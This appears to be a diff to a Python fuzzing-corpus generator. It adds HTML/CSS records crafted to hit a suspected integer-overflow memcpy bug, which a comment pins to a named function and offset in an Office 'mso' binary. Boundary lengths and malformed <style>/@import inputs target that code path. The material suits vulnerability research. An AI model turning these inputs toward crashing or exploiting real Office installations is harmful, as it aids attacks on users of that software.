@@ -113,4 +113,24 @@ with open(out, "wb") as f:
     for name, body in recs:
         f.write(("%d\n" % len(body)).encode("ascii"))
         f.write(body)
+
+# ---- CSS family: FImportStyleSheet (mso 20092 x64 rva 0x7F9250) takes n from FClassifyRgwch's int*
+# out-param, allocates 2*(n+2) with a 32-bit add and no sign test, then memcpy's 2*n into buf+2.
+# These records put markup inside <style> / @import so the CSS classify runs on attacker-chosen text:
+# unterminated strings and comments at EOF, quotes immediately before </style>, rules with no body,
+# @import with a truncated url(), and the same shapes nested inside a div (both producers in one pass).
+for k in (1, 2, 3, 8, 64, 256, 4013, 4014, 4015):
+    add("css_rule_%d" % k, "<html><head><style>div{color:red}" + "a" * k + "</style></head><body>x</body></html>")
+    add("css_open_str_%d" % k, "<html><head><style>x{y:\"abc" + "z" * k)
+    add("css_close_str_%d" % k, "<html><head><style>x{y:\"abc\"}" + "w" * k)
+    add("css_comment_eof_%d" % k, "<html><head><style>/*" + "c" * k)
+    add("css_import_trunc_%d" % k, "<html><head><style>@import url(\"a" + "b" * k)
+    add("css_no_close_tag_%d" % k, "<html><head><style>p{color:blue}</p>" + "d" * k)
+    add("css_in_div_%d" % k, "<html><body><div><style>em{x:y}" + "e" * k + "</style></div>")
+add("css_empty_rule", "<html><head><style>{}</style></head><body>q</body></html>")
+add("css_only_at", "<html><head><style>@charset \"utf-8\";")
+add("css_utf16_mix", "<html><head><style>@import url(file:///nonexistent/")
+add("css_brace_no_semi", "<html><head><style>a{b c")
+add("css_deep_braces", "<html><head><style>" + ("a{b:" * 60) + "v" * 300)
+
 print("records=%d file=%s" % (len(recs), out))
